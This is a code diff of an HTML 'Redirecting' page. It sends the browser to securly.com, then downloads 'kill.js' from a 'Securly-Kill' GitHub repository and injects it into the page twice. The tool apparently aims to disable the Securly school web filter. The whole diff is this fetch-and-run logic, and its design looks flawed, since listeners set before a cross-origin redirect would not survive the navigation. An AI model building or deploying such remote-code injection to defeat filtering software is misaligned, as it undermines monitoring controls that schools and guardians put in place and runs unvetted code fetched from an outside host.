@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting</title>
     <script>
-        // Redirect and handle script injection
         window.addEventListener('load', () => {
             const redirectUrl = 'https://securly.com';
             const scriptUrl = 'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js';
@@ -17,37 +16,36 @@
 
                 // Listen for the 'pageshow' event after redirection
                 window.addEventListener('pageshow', () => {
-                    let executionCount = 0;
+                    // Load the script once
+                    fetch(scriptUrl)
+                        .then(response => {
+                            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+                            return response.text();
+                        })
+                        .then(scriptContent => {
+                            let executionCount = 0;
 
-                    const executeScript = () => {
-                        fetch(scriptUrl)
-                            .then(response => {
-                                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-                                return response.text();
-                            })
-                            .then(scriptContent => {
+                            const executeScript = () => {
                                 const scriptElement = document.createElement('script');
                                 scriptElement.textContent = scriptContent;
                                 document.body.appendChild(scriptElement);
                                 console.log(`Injected script executed (${executionCount + 1}/2).`);
-                            })
-                            .catch(err => console.error('Error fetching script:', err));
-                    };
 
-                    // Execute script twice with a delay
-                    const interval = setInterval(() => {
-                        if (executionCount < 2) {
+                                executionCount++;
+                                if (executionCount < 2) {
+                                    setTimeout(executeScript, 500); // Execute again after 500 ms
+                                } else {
+                                    console.log('Both script executions complete. Stopping page load.');
+                                    window.stop(); // Stop page loading
+                                }
+                            };
+
+                            // Execute the script for the first time
                             executeScript();
-                            executionCount++;
-                        } else {
-                            clearInterval(interval); // Stop after two executions
-                            console.log('Both scripts executed. Stopping page load.');
-                            setTimeout(500)
-                            window.stop(); // Stop page loading
-                        }
-                    }, 3000); // 3 seconds delay between executions
+                        })
+                        .catch(err => console.error('Error fetching script:', err));
                 });
-            }, 3000); // Initial 3-second delay
+            }, 3000); // Initial delay (3 seconds)
         });
     </script>
 </head>
